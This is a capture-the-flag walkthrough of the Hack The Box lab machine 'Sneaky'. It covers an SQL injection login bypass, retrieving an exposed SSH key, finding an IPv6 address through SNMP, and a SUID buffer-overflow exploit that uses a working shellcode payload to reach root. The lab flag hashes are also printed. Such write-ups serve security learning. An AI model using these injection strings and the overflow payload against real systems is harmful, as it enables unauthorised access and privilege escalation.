# Sneaky
#### 10.10.10.20
###### Dotaplayer365


```{r, engine='bash', count_lines}
nmap 10.10.10.20

PORT   STATE SERVICE
80/tcp open  http
```

The website shows that its under construction

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Sneaky/images/Under-Construction.PNG">


Dirbuster Initiate!

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Sneaky/images/Dirbuster.PNG"></kbd>

Well ofcourse, its under **dev**elopment


We are greeted by a Login screen

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Sneaky/images/Login.PNG"></kdb>


Whats the autoresponse when we see a poorly made login page ?

Yes **' or '1' = '1**

Simple sql injection. Seems legit

After the login we get juicy stuff
<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Sneaky/images/Post-Login.PNG"></kdb>

Lets make a note of the info:

- name: admin
- name: thrasvilous
- RSA Private key
- We are No-one

Lets wget the RSA key

And because its a Private SSH key, we change its perms

```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Sneaky# wget http://10.10.10.20/dev/sshkeyforadministratordifficulttimes
--2017-11-07 17:24:48--  http://10.10.10.20/dev/sshkeyforadministratordifficulttimes
Connecting to 10.10.10.20:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1675 (1.6K)
Saving to: ‘sshkeyforadministratordifficulttimes’

sshkeyforadministratordifficulttimes  100%[=======================================================================>]   1.64K  --.-KB/s    in 0s      

2017-11-07 17:24:48 (120 MB/s) - ‘sshkeyforadministratordifficulttimes’ saved [1675/1675]

root@kali:~/Hackthebox/Sneaky# mv sshkeyforadministratordifficulttimes adminssh.key

root@kali:~/Hackthebox/Sneaky# chmod 600 adminssh.key 

```

**BUT!!!**

We dont have a port 22 (ssh) open on this box. Maybe it was setup on a different port.

Lets nmap all the ports 

After spending millions of years completing the nmap we see that there is no other ssh port open.

![Alt test](https://media.giphy.com/media/l46CbAuxFk2Cz0s2A/giphy.gif)


Hold up! we found something else though

Port 161

Investigate Further

We get shit tons of info

```{r, engine='bash', count_lines}
nmap -sS -sU -p 161 -T4 -A 10.10.10.20

161/udp open   snmp    SNMPv1 server; net-snmp SNMPv3 server (public)

snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 129.30 Kb sent, 129.30 Kb received
|   eth0
|     IP address: 10.10.10.20  Netmask: 255.255.255.0
|     MAC address: 00:50:56:aa:35:f3 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 45.08 Mb sent, 41.13 Mb received
| snmp-netstat: 
|   TCP  127.0.0.1:3306       0.0.0.0:0
|_  UDP  0.0.0.0:161          *:*


```
We are SURE that there is a ssh port open, but we cant find it here...

Maybe its ipv6

Lets check what ipv6 we get for the openvpn

```{r, engine='bash', count_lines}
inet 10.10.14.52  netmask 255.255.254.0  destination 10.10.14.52
inet6 dead:beef:2::1032  prefixlen 64  scopeid 0x0<global>
```

A wise gentelman from ![stack overflow](https://stackoverflow.com/questions/27693120/convert-from-mac-to-ipv6/27693666#27693666) helped us
<kdb><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Sneaky/images/stack-ipv6.PNG"></kdb>



A little bit or "Trying Harder" and knowing that our local prefix should be dead:beef we get something like this

```{r, engine='bash', count_lines}
dead:beef::250:56ff:feaa:35f3 
```
The MAC changes after every restart, so this wont always be the same

lets try and connect to it via ssh and out key

```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Sneaky# ssh -6 dead:beef::250:56ff:feaa:35f3
The authenticity of host 'dead:beef::250:56ff:feaa:35f3 (dead:beef::250:56ff:feaa:35f3)' can't be established.
ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
Are you sure you want to continue connecting (yes/no)? 
```

Say Whaaaaat!!!!

Such Sneaky Much Wow


Time to get rocking

We have the key, the username is thrasivoulos , lets connect

```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Sneaky# ssh -6 -i adminssh.key thrasivoulos@dead:beef::250:56ff:feaa:35f3
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Nov  7 14:33:29 EET 2017

  System load:  0.0               Processes:           181
  Usage of /:   9.8% of 18.58GB   Users logged in:     1
  Memory usage: 23%               IP address for eth0: 10.10.10.20
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Tue Nov  7 14:33:30 2017 from dead:beef:2::1032
thrasivoulos@Sneaky:~$ 

```

**user.txt**
```{r, engine='bash', count_lines}
thrasivoulos@Sneaky:~$ cat user.txt
9fe14f76222db23a770f20136751bdab
```

_Mission: Root_

We do our basic enumeration stuff. LinEnum and manually checking things assuming we have pristine eyesight, but nada.

While checking Advanced Linux File Permissions (Sticky bit, SUID, GUID) we come across something fishy

```{r, engine='bash', count_lines}
-rwsrwsr-x 1 root root 7301 May  4  2017 /usr/local/bin/chal
```

Ayyaayaay!!
Its some buffer overflow shizz

Debug Mode Activate:

Running strings on it shows that it has "strcpy"
Lets assume that this exec takes some string as input and bash away then

```{r, engine='bash', count_lines}
thrasivoulos@Sneaky:/usr/local/bin$ ./chal test
thrasivoulos@Sneaky:/usr/local/bin$ 
```
Nothing

```{r, engine='bash', count_lines}
thrasivoulos@Sneaky:/usr/local/bin$ ./chal `python -c 'print "A" * 500'`
Segmentation fault (core dumped)
```
We pass some A's into it and we get a segfault

Nice la!

```{r, engine='bash', count_lines}
thrasivoulos@Sneaky:/usr/local/bin$ dmesg | tail -1
[10842.858514] chal[3908]: segfault at 41414141 ip 41414141 sp bffff510 error 14
```
The stack Pointer is at : bffff510

We will use our trusted Shell storm  [!execve](http://shell-storm.org/shellcode/files/shellcode-827.php)

The only thing we need now is the offset.

Creating a pattern on our kali machine
```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Sneaky# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

Passing it through the chal file
```{r, engine='bash', count_lines}
thrasivoulos@Sneaky:/usr/local/bin$ ./chal Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
Segmentation fault (core dumped)
thrasivoulos@Sneaky:/usr/local/bin$ dmesg | tail -1
[11276.386936] chal[3920]: segfault at 316d4130 ip 316d4130 sp bffff510 error 14
```

Getting Offset
```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Sneaky# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 316d4130 -l 500
[*] Exact match at offset 362
```

So everything looks ready:
- Offset: 362
- Stack Pointer: bffff510
- Exploit to be used: [!execve](http://shell-storm.org/shellcode/files/shellcode-827.php)

Time to craft some nice python for the chal

A* 362 + Stack Pointer + NOP Sleds + execve
```python
import struct; print "A"*362+struct.pack("I", 0xbffff510)+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```

```{r, engine='bash', count_lines}
thrasivoulos@Sneaky:/usr/local/bin$ ./chal $(python -c 'import struct; print "A"*362+struct.pack("I", 0xbffff510)+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
# id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)
```

**root.txt**
```{r, engine='bash', count_lines}
# cat root.txt
c5153d86cb175a9d5d9a5cc81736fb33
```
